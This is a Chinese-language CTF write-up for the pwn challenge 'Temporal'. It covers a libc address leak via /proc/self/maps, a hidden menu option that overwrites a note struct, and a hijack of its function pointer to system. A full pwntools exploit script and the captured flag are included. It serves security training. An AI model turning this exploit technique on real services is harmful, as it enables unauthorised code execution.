# Temporal

## 题目信息

- 类型：Pwn
- 题目状态：已解出
- 题目附件：`vuln`
- 题目描述：

```text
i had a heck of a time making this one

nc 0.cloud.chals.io 26716
```

- 核心突破点：`5` 号菜单会无条件解析 `/proc/self/maps` 泄露 libc 基址，隐藏 `8` 号菜单又能用一次 `read(0, note, 0x210)` 直接覆写整个 note 结构，因此可以把 note 的函数指针改成 `system`，再用 `3` 号菜单触发执行

## 入口与现象

程序表面菜单只有 1 到 7：

```text
1. Create note
2. Delete note
3. Print note
4. Upload file to note
5. Parse leak from note
6. Stat a path
7. Exit
```

静态看一下二进制特征：

- `No PIE`
- `No canary`
- 栈可执行
- 符号未剥离

函数名也基本都在，关键函数包括：

- `parse_proc_leak`
- `dispatch_note`
- `raw_write_note`
- `_bg_delete.0`

题面和函数名很容易先把注意力放到异步删除和竞态上，但把几个核心函数看完后会发现，这题其实有一条更短的利用链。

## 分析过程

### 1. note 结构

`alloc_note` 申请了 `0x210` 字节的 chunk，布局非常直接：

```c
struct note {
    char content[0x200];
    void (*fn)(struct note *);
    int id;
    int active;
};
```

初始化时：

- `fn = print_note`
- `id = 用户输入的编号`
- `active = 1`

`dispatch_note` 的逻辑也很简单：

```c
if (notes[idx] && notes[idx]->active) {
    notes[idx]->fn(notes[idx]);
}
```

也就是说，只要能改到 `fn`，就能把一次 “打印 note” 变成任意单参数函数调用。

### 2. `5` 号菜单直接白送 libc 泄露

`parse_proc_leak` 前半段会尝试把某个 note 当成 `/proc/self/maps` 内容来解析，但这不是重点。真正关键的是它后半段无论前面成功与否，都会自己：

1. `open("/proc/self/maps", 0)`
2. 逐行找包含 `libc` 的映射
3. 用 `%lx-` 解析起始地址
4. 直接输出

所以进程序以后，甚至不需要先准备 note，直接选 `5` 就能拿到：

```text
[LEAK] libc base: 0x7f389f84b000
```

这一步把 ASLR 直接抹掉了。

### 3. 隐藏的 `8` 号菜单是最致命的点

虽然菜单只显示到 7，但 `main` 实际还处理了两个隐藏选项：

- `8` -> `raw_write_note`
- `9` -> 启动后台删除线程

其中 `raw_write_note` 的逻辑是：

```c
note = notes[idx];
if (note) {
    read(0, note, 0x210);
}
```

这里不是只写 content，而是把整块 `0x210` 字节都重写了，所以可以一次性覆盖：

- `content`
- `fn`
- `id`
- `active`

于是利用思路就很直接了：

1. 先用 `5` 泄露 libc base
2. 新建一个 note
3. 用隐藏 `8` 把这个 note 改成：
   - `content = "sh -c 'cat /flag* ...'"`
   - `fn = system`
   - `active = 1`
4. 再用 `3` 触发 `dispatch_note`

于是程序实际执行的是：

```c
system(note->content);
```

### 4. 一个实战坑：程序混用了 `scanf/fgets` 和 `read`

这个点在写 exp 时必须注意。

前面的菜单交互走的是 `scanf` / `fgets`，隐藏 `8` 却突然切到了底层 `read(0, ...)`。实际打远程时，如果在发完 note id 之后立刻无脑把 payload 连着塞过去，stdio 有机会把后面的字节预读进自己的缓冲区，导致 `read` 拿不到完整的 `0x210` 字节。

实测最稳的做法是：

1. 选 `8`
2. 发送 note id
3. `sleep` 一小会儿，让程序真正阻塞在 `read`
4. 再发二进制 payload

这也是这题最容易把 exploit 写崩的细节之一。

## 利用过程

1. 连接远程服务，直接选择 `5`，拿到 libc 基址。
2. 选择 `1` 创建一个 note。
3. 通过隐藏菜单 `8` 向 note 原地写入 `0x210` 字节：
   - 前 `0x200` 字节放命令字符串
   - `+0x200` 放 `system`
   - `+0x208` 放 note id
   - `+0x20c` 放 `1`
4. 再选 `3` 打印该 note。
5. `dispatch_note` 实际调用 `system(note)`，命令执行，直接读出 flag。

这题里那个异步删除线程确实能做 UAF，但拿 flag 并不需要走到那一步，隐藏 `8` 已经足够直达控制流。

## 关键 payload / 命令

本题远程环境命中的 `system` 偏移为：

```text
system = libc_base + 0x50d70
```

核心 exp 如下，完整脚本我也放在同目录的 `Temporal-exp.py` 里：

```python
from pwn import *
import re
import time

io = remote("0.cloud.chals.io", 26716)
io.recvuntil(b"> ")

io.sendline(b"5")
io.sendlineafter(b"note id containing /proc data: ", b"0")
data = io.recvuntil(b"> ")
libc_base = int(re.search(rb"0x([0-9a-f]+)", data).group(1), 16)
system = libc_base + 0x50d70

io.sendline(b"1")
io.sendlineafter(b"id (0-15): ", b"0")
io.sendlineafter(b"content: ", b"AAAA")
io.recvuntil(b"> ")

cmd = b"sh -c 'cat /flag* /challenge/flag* /home/*/flag* 2>/dev/null'\x00"
payload = cmd.ljust(0x200, b"\x00")
payload += p64(system)
payload += p32(0)
payload += p32(1)

io.sendline(b"8")
io.sendlineafter(b"id: ", b"0")
time.sleep(0.3)
io.send(payload)
io.recvuntil(b"> ")

io.sendline(b"3")
io.sendlineafter(b"id: ", b"0")
print(io.recvrepeat(1).decode())
```

实际输出：

```text
UDCTF{t1m3_15_f4k3}
```

## Flag

```text
UDCTF{t1m3_15_f4k3}
```

## 总结

这题最像烟雾弹的地方反而是题面最显眼的“Temporal”主题和后台删除线程。真正决定胜负的是两个隐藏点：

1. `parse_proc_leak` 直接把 libc base 白送出来。
2. 隐藏 `8` 可以整块覆写 note，把函数指针直接改成 `system`。

拿到这两个点以后，整题就从“竞态 + UAF”变成了“一次 libc 泄露 + 一次函数指针劫持”的直线题。唯一需要在 exploit 里额外小心的，就是程序混用 stdio 和 `read` 带来的短读 / 预读问题。
